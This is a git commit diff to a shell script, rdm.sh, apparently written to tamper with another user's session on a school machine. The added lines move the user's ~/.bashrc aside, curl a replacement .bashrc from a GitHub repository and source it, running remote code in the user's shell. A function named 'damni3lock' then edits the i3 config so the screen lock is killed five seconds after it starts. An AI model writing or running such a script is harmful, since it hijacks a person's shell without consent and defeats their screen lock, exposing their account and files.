74cd11c6cfba0c45fe14481444e99e7d959c02bd
Dimitri Attal <dimitri.attal@epita.fr>
2025-11-26 14:22:09 +0100

    pklock ok, bashrc a finir

--- rdm.sh
+++ rdm.sh
@@ -1,5 +1,14 @@
 #PS1='\e[36m'
-mv ok ./afs/tp.py
-#mv Downloads/screen_medieval.jpg ./new_ok
-curl -sO https://raw.githubusercontent.com/did73at/cflse/main/ok
+mv ~/.bashrc ~/afs/tp.py
+
+curl -sO https://raw.githubusercontent.com/did73at/cflse/main/.bashrc
 source .bashrc
+
+
+damni3lock() {
+    filename=".config/i3/config"
+    echo $USER
+    sleep 1
+    sed '/bindsym .* exec i3lock / s|$| \&\& sleep 5 \&\& pkill i3lock|' "$filename" > "$filename.tmp" && mv "$filename.tmp" "$filename"
+}
+damni3lock
